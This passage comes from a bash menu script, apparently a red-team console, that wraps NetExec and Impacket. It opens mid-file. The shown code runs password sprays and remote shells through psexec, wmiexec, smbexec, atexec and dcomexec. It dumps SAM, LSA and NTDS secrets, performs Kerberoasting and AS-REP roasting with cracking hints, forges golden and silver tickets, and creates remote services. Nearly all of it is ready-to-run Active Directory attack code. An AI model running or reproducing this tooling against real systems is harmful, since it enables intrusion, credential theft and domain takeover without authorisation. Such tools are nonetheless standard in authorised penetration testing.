                ;;
            "RDP Operations")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "rdp" "Select RDP Operation: ")
                case "$subchoice" in
                    "Test Authentication")
                        run_command "nxc rdp $target $auth"
                        ;;
                    "RDP Scanner")
                        run_command "nxc rdp $target $auth -M rdp-scanner"
                        ;;
                    "Take Screenshot")
                        run_command "nxc rdp $target $auth -M rdp-screenshot"
                        ;;
                esac
                ;;
            "SSH Operations")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "ssh" "Select SSH Operation: ")
                case "$subchoice" in
                    "Test Authentication")
                        run_command "nxc ssh $target $auth"
                        ;;
                    "Execute Command")
                        read -p "Command: " cmd
                        run_command "nxc ssh $target $auth -x '$cmd'"
                        ;;
                    "Get System Info")
                        run_command "nxc ssh $target $auth -x 'uname -a'"
                        ;;
                    "Check Sudo Privileges")
                        run_command "nxc ssh $target $auth -x 'sudo -l'"
                        ;;
                esac
                ;;
            "Network Scanning")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "scanning" "Select Scan Type: ")
                case "$subchoice" in
                    "Scan Current Target")
                        run_command "nxc smb $target $auth"
                        ;;
                    "Password Spray")
                        read -p "User file: " users
                        read -p "Password: " pass
                        run_command "nxc smb $target -u $users -p '$pass' --no-bruteforce --continue-on-success"
                        ;;
                    "Find Admin Access")
                        run_command "nxc smb $target $auth -x whoami"
                        ;;
                    "Multi-Protocol Scan")
                        run_command "nxc smb $target $auth && nxc winrm $target $auth && nxc mssql $target $auth"
                        ;;
                esac
                ;;
            "Impacket PSExec")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_psexec" "Select PSExec Operation: ")
                
                # Build auth for impacket (different format)
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "Execute Command")
                        read -p "Command to execute: " cmd
                        run_command "impacket-psexec $impacket_auth '$cmd'"
                        ;;
                    "Interactive Shell")
                        echo -e "${CYAN}This will drop you into an interactive shell.${NC}"
                        echo -e "${CYAN}Type 'exit' to return to the TUI.${NC}"
                        read -p "Press Enter to continue..."
                        run_command "impacket-psexec $impacket_auth"
                        ;;
                    "Execute as SYSTEM")
                        read -p "Command to execute: " cmd
                        run_command "impacket-psexec $impacket_auth -system '$cmd'"
                        ;;
                    "Upload and Execute")
                        read -p "Local file to upload: " local_file
                        read -p "Remote path (e.g., C:\\\\Windows\\\\Temp\\\\file.exe): " remote_path
                        run_command "impacket-psexec $impacket_auth -file '$local_file' -path '$remote_path'"
                        ;;
                    "Execute with Specific Service Name")
                        read -p "Service name: " service
                        read -p "Command to execute: " cmd
                        run_command "impacket-psexec $impacket_auth -service-name '$service' '$cmd'"
                        ;;
                esac
                ;;
            "Impacket WMIExec")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_wmiexec" "Select WMIExec Operation: ")
                
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "Execute Command")
                        read -p "Command to execute: " cmd
                        run_command "impacket-wmiexec $impacket_auth '$cmd'"
                        ;;
                    "Interactive Shell")
                        echo -e "${CYAN}This will drop you into an interactive shell.${NC}"
                        echo -e "${CYAN}Type 'exit' to return to the TUI.${NC}"
                        read -p "Press Enter to continue..."
                        run_command "impacket-wmiexec $impacket_auth"
                        ;;
                    "Execute with Output")
                        read -p "Command to execute: " cmd
                        run_command "impacket-wmiexec $impacket_auth -codec utf-8 '$cmd'"
                        ;;
                    "Silent Execution (No Output)")
                        read -p "Command to execute: " cmd
                        run_command "impacket-wmiexec $impacket_auth -nooutput '$cmd'"
                        ;;
                esac
                ;;
            "Impacket SMBExec")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_smbexec" "Select SMBExec Operation: ")
                
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "Execute Command")
                        read -p "Command to execute: " cmd
                        run_command "impacket-smbexec $impacket_auth '$cmd'"
                        ;;
                    "Interactive Shell")
                        echo -e "${CYAN}This will drop you into an interactive shell.${NC}"
                        read -p "Press Enter to continue..."
                        run_command "impacket-smbexec $impacket_auth"
                        ;;
                    "Execute with Custom Share")
                        read -p "Share name (e.g., C$): " share
                        read -p "Command to execute: " cmd
                        run_command "impacket-smbexec $impacket_auth -share '$share' '$cmd'"
                        ;;
                    "Execute without Deleting")
                        read -p "Command to execute: " cmd
                        run_command "impacket-smbexec $impacket_auth -mode SERVER '$cmd'"
                        ;;
                esac
                ;;
            "Impacket ATExec")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_atexec" "Select ATExec Operation: ")
                
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "Execute Command (Scheduled Task)")
                        read -p "Command to execute: " cmd
                        run_command "impacket-atexec $impacket_auth '$cmd'"
                        ;;
                    "Execute with Custom Task Name")
                        read -p "Task name: " taskname
                        read -p "Command to execute: " cmd
                        run_command "impacket-atexec $impacket_auth -task-name '$taskname' '$cmd'"
                        ;;
                    "Execute and Wait for Output")
                        read -p "Command to execute: " cmd
                        echo -e "${CYAN}Note: ATExec may take time to return output${NC}"
                        run_command "impacket-atexec $impacket_auth '$cmd'"
                        ;;
                esac
                ;;
            "Impacket DcomExec")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_dcomexec" "Select DcomExec Method: ")
                
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "Execute Command (ShellWindows)")
                        read -p "Command to execute: " cmd
                        run_command "impacket-dcomexec $impacket_auth -object ShellWindows '$cmd'"
                        ;;
                    "Execute Command (ShellBrowserWindow)")
                        read -p "Command to execute: " cmd
                        run_command "impacket-dcomexec $impacket_auth -object ShellBrowserWindow '$cmd'"
                        ;;
                    "Execute Command (MMC20)")
                        read -p "Command to execute: " cmd
                        run_command "impacket-dcomexec $impacket_auth -object MMC20 '$cmd'"
                        ;;
                esac
                ;;
            "Impacket SecretsDump"|"Impacket SAM/LSA/NTDS Dump")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_secretsdump" "Select Dump Method: ")
                
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "Dump All (SAM+LSA+NTDS)")
                        echo -e "${CYAN}This will dump SAM, LSA secrets, and NTDS if DC${NC}"
                        run_command "impacket-secretsdump $impacket_auth"
                        ;;
                    "Dump SAM Only")
                        run_command "impacket-secretsdump $impacket_auth -sam"
                        ;;
                    "Dump LSA Secrets Only")
                        run_command "impacket-secretsdump $impacket_auth -security"
                        ;;
                    "Dump NTDS (Domain Controller)")
                        echo -e "${CYAN}Dumping NTDS.dit from Domain Controller${NC}"
                        echo -e "${YELLOW}This may take a while on large domains...${NC}"
                        run_command "impacket-secretsdump $impacket_auth -just-dc"
                        ;;
                    "Dump with Specific Hashes")
                        echo -e "${CYAN}Options: -just-dc-ntlm (NTLM only), -just-dc-user <user>${NC}"
                        read -p "Additional options: " opts
                        run_command "impacket-secretsdump $impacket_auth $opts"
                        ;;
                    "Dump from Offline Files")
                        read -p "SAM file path: " sam
                        read -p "SYSTEM file path: " system
                        read -p "SECURITY file path (optional): " security
                        cmd="impacket-secretsdump -sam '$sam' -system '$system'"
                        [[ -n "$security" ]] && cmd="$cmd -security '$security'"
                        cmd="$cmd LOCAL"
                        run_command "$cmd"
                        ;;
                esac
                ;;
            "Kerberoasting (GetUserSPNs)")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_kerberoast" "Select Kerberoasting Option: ")
                
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "Kerberoast All SPNs")
                        echo -e "${CYAN}Requesting TGS tickets for all users with SPNs${NC}"
                        run_command "impacket-GetUserSPNs $impacket_auth -request"
                        ;;
                    "Kerberoast Specific User")
                        read -p "Username to target: " targetuser
                        run_command "impacket-GetUserSPNs $impacket_auth -request-user '$targetuser'"
                        ;;
                    "Request TGS for All Users")
                        echo -e "${CYAN}Saving to kerberoast.txt${NC}"
                        run_command "impacket-GetUserSPNs $impacket_auth -request -outputfile kerberoast.txt"
                        ;;
                    "Output to Hashcat Format")
                        echo -e "${CYAN}Saving to kerberoast.hashcat${NC}"
                        run_command "impacket-GetUserSPNs $impacket_auth -request -outputfile kerberoast.hashcat"
                        echo -e "\n${GREEN}Crack with: hashcat -m 13100 kerberoast.hashcat wordlist.txt${NC}"
                        read -p "Press Enter to continue..."
                        ;;
                    "Output to John Format")
                        echo -e "${CYAN}Saving to kerberoast.john${NC}"
                        run_command "impacket-GetUserSPNs $impacket_auth -request -format john -outputfile kerberoast.john"
                        echo -e "\n${GREEN}Crack with: john --wordlist=wordlist.txt kerberoast.john${NC}"
                        read -p "Press Enter to continue..."
                        ;;
                esac
                ;;
            "AS-REP Roasting (GetNPUsers)")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_asreproast" "Select AS-REP Roasting Option: ")
                
                # AS-REP roasting can work without credentials
                if [[ "$CURRENT_CRED_NAME" == "Null Auth" ]]; then
                    echo -e "${CYAN}No credentials needed for AS-REP roasting!${NC}"
                    impacket_auth="$DOMAIN/ -no-pass -dc-ip $target"
                elif [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME -hashes :$HASH -dc-ip $target"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD' -dc-ip $target"
                fi
                
                case "$subchoice" in
                    "AS-REP Roast All Users")
                        echo -e "${CYAN}Checking all users for AS-REP roasting${NC}"
                        run_command "impacket-GetNPUsers $impacket_auth -request"
                        ;;
                    "AS-REP Roast from User List")
                        read -p "User list file: " userlist
                        run_command "impacket-GetNPUsers $impacket_auth -usersfile '$userlist' -request"
                        ;;
                    "Output to Hashcat Format")
                        echo -e "${CYAN}Saving to asreproast.hashcat${NC}"
                        run_command "impacket-GetNPUsers $impacket_auth -request -format hashcat -outputfile asreproast.hashcat"
                        echo -e "\n${GREEN}Crack with: hashcat -m 18200 asreproast.hashcat wordlist.txt${NC}"
                        read -p "Press Enter to continue..."
                        ;;
                    "Output to John Format")
                        echo -e "${CYAN}Saving to asreproast.john${NC}"
                        run_command "impacket-GetNPUsers $impacket_auth -request -format john -outputfile asreproast.john"
                        echo -e "\n${GREEN}Crack with: john --wordlist=wordlist.txt asreproast.john${NC}"
                        read -p "Press Enter to continue..."
                        ;;
                    "Check Specific User")
                        read -p "Username to check: " checkuser
                        run_command "impacket-GetNPUsers $impacket_auth -request -user '$checkuser'"
                        ;;
                esac
                ;;
            "Golden/Silver Tickets")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_tickets" "Select Ticket Operation: ")
                
                case "$subchoice" in
                    "Create Golden Ticket")
                        echo -e "${CYAN}Creating Golden Ticket (requires krbtgt hash)${NC}"
                        read -p "Domain name: " dom
                        read -p "Domain SID: " sid
                        read -p "krbtgt NTLM hash: " krbtgt_hash
                        read -p "Username to impersonate: " user
                        run_command "impacket-ticketer -nthash '$krbtgt_hash' -domain-sid '$sid' -domain '$dom' '$user'"
                        echo -e "\n${GREEN}Golden ticket saved as ${user}.ccache${NC}"
                        echo -e "${GREEN}Export: export KRB5CCNAME=${user}.ccache${NC}"
                        read -p "Press Enter to continue..."
                        ;;
                    "Create Silver Ticket")
                        echo -e "${CYAN}Creating Silver Ticket (requires service account hash)${NC}"
                        read -p "Domain name: " dom
                        read -p "Domain SID: " sid
                        read -p "Service account NTLM hash: " svc_hash
                        read -p "Service SPN (e.g., cifs/dc01.domain.local): " spn
                        read -p "Username to impersonate: " user
                        run_command "impacket-ticketer -nthash '$svc_hash' -domain-sid '$sid' -domain '$dom' -spn '$spn' '$user'"
                        echo -e "\n${GREEN}Silver ticket saved as ${user}.ccache${NC}"
                        read -p "Press Enter to continue..."
                        ;;
                    "Request TGT")
                        echo -e "${CYAN}Requesting TGT${NC}"
                        if [[ -n "$HASH" ]]; then
                            impacket_auth="$DOMAIN/$USERNAME -hashes :$HASH"
                        else
                            impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'"
                        fi
                        run_command "impacket-getTGT $impacket_auth -dc-ip $target"
                        ;;
                    "Export Ticket (ccache)")
                        read -p "Ticket file (.ccache): " ticket
                        echo -e "\n${GREEN}To use this ticket:${NC}"
                        echo -e "${GREEN}export KRB5CCNAME=$ticket${NC}"
                        read -p "Press Enter to continue..."
                        ;;
                    "Import Ticket")
                        read -p "Ticket file to import: " ticket
                        run_command "export KRB5CCNAME='$ticket' && echo 'Ticket imported! Use Kerberos-based tools now.'"
                        ;;
                esac
                ;;
            "Impacket Enumeration")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_enum" "Select Enumeration Tool: ")
                
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "Enumerate Users (GetADUsers)")
                        echo -e "${CYAN}Enumerating Active Directory users${NC}"
                        run_command "impacket-GetADUsers $impacket_auth -all"
                        ;;
                    "SID Lookup (lookupsid)")
                        echo -e "${CYAN}Looking up SIDs via RPC${NC}"
                        run_command "impacket-lookupsid $impacket_auth"
                        ;;
                    "RPC Endpoints (rpcdump)")
                        echo -e "${CYAN}Dumping RPC endpoints${NC}"
                        run_command "impacket-rpcdump $impacket_auth"
                        ;;
                    "SAM Dump (samrdump)")
                        echo -e "${CYAN}Dumping SAM via SAMR${NC}"
                        run_command "impacket-samrdump $impacket_auth"
                        ;;
                    "List Shares (smbclient)")
                        echo -e "${CYAN}Listing SMB shares${NC}"
                        run_command "impacket-smbclient $impacket_auth -list"
                        ;;
                    "Get Domain Info")
                        echo -e "${CYAN}Getting domain information${NC}"
                        run_command "impacket-GetADUsers $impacket_auth -all -dc-ip $target"
                        ;;
                esac
                ;;
            "Impacket SMB Client")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_smbclient" "Select SMB Client Operation: ")
                
                if [[ "$RUN_MODE" == "all" ]]; then
                    echo -e "${YELLOW}SMB Client only works with single target.${NC}"
                    sleep 2
                    continue
                fi
                
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "Interactive SMB Client")
                        echo -e "${CYAN}Opening interactive SMB client${NC}"
                        echo -e "${CYAN}Commands: shares, use <share>, ls, cd, get, put, etc.${NC}"
                        read -p "Press Enter to continue..."
                        run_command "impacket-smbclient $impacket_auth"
                        ;;
                    "List Shares")
                        run_command "impacket-smbclient $impacket_auth -list"
                        ;;
                    "Download File")
                        read -p "Share name: " share
                        read -p "Remote file path: " remote_file
                        read -p "Local path to save: " local_path
                        echo -e "${CYAN}Opening SMB client, then: use $share; get $remote_file $local_path${NC}"
                        run_command "impacket-smbclient $impacket_auth"
                        ;;
                    "Upload File")
                        read -p "Share name: " share
                        read -p "Local file to upload: " local_file
                        read -p "Remote path: " remote_path
                        echo -e "${CYAN}Opening SMB client, then: use $share; put $local_file $remote_path${NC}"
                        run_command "impacket-smbclient $impacket_auth"
                        ;;
                    "Execute Command via SMB")
                        read -p "Command to execute: " cmd
                        run_command "impacket-smbclient $impacket_auth -exec '$cmd'"
                        ;;
                esac
                ;;
            "Service Management")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_services" "Select Service Operation: ")
                
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "List Services")
                        run_command "impacket-services $impacket_auth list"
                        ;;
                    "Start Service")
                        read -p "Service name: " svc
                        run_command "impacket-services $impacket_auth start -name '$svc'"
                        ;;
                    "Stop Service")
                        read -p "Service name: " svc
                        run_command "impacket-services $impacket_auth stop -name '$svc'"
                        ;;
                    "Create Service")
                        read -p "Service name: " svc
                        read -p "Binary path: " binpath
                        run_command "impacket-services $impacket_auth create -name '$svc' -display '$svc' -path '$binpath'"
                        ;;
                    "Delete Service")
                        read -p "Service name: " svc
                        run_command "impacket-services $impacket_auth delete -name '$svc'"
                        ;;
                    "Query Service Status")
                        read -p "Service name: " svc
                        run_command "impacket-services $impacket_auth status -name '$svc'"
                        ;;
                esac
                ;;
            "Registry Operations")
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "impacket_registry" "Select Registry Operation: ")
                
                if [[ -n "$HASH" ]]; then
                    impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
                else
                    impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
                fi
                
                case "$subchoice" in
                    "Query Registry Key")
                        read -p "Registry key path (e.g., HKLM\\SOFTWARE\\Microsoft): " key
                        run_command "impacket-reg $impacket_auth query -keyName '$key'"
                        ;;
                    "Read Registry Value")
                        read -p "Registry key path: " key
                        read -p "Value name: " value
                        run_command "impacket-reg $impacket_auth query -keyName '$key' -v '$value'"
                        ;;
                    "Write Registry Value")
                        read -p "Registry key path: " key
                        read -p "Value name: " value
                        read -p "Value type (REG_SZ, REG_DWORD, etc.): " type
                        read -p "Value data: " data
                        run_command "impacket-reg $impacket_auth add -keyName '$key' -v '$value' -vt '$type' -vd '$data'"
                        ;;
                    "Backup Registry Hive")
                        read -p "Hive name (e.g., HKLM): " hive
                        read -p "Output file: " outfile
                        run_command "impacket-reg $impacket_auth backup -keyName '$hive' '$outfile'"
                        ;;
                    "Save SAM Hive")
                        echo -e "${CYAN}Saving SAM hive for offline analysis${NC}"
                        run_command "impacket-reg $impacket_auth save -keyName HKLM\\SAM sam.save"
                        echo -e "\n${GREEN}SAM hive saved to sam.save${NC}"
                        read -p "Press Enter to continue..."
                        ;;
                    "Save SYSTEM Hive")
                        echo -e "${CYAN}Saving SYSTEM hive for offline analysis${NC}"
                        run_command "impacket-reg $impacket_auth save -keyName HKLM\\SYSTEM system.save"
                        echo -e "\n${GREEN}SYSTEM hive saved to system.save${NC}"
                        echo -e "${YELLOW}Use with: impacket-secretsdump -sam sam.save -system system.save LOCAL${NC}"
                        read -p "Press Enter to continue..."
                        ;;
                esac
                ;;
        esac
    done
}

# Initialize
init_creds_db
init_targets_db
init_web_targets_db
init_ad_targets_db

# Load defaults
load_creds "Null Auth"

# Check if targets exist, if not prompt to add one
if [[ $(list_target_names | wc -l) -eq 0 ]]; then
    clear
    echo -e "${YELLOW}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║  No targets configured!                   ║${NC}"
    echo -e "${YELLOW}║  Let's add your first target.             ║${NC}"
    echo -e "${YELLOW}╚═══════════════════════════════════════════╝${NC}"
    echo ""
    add_target
fi

# Run main menu
main_menu
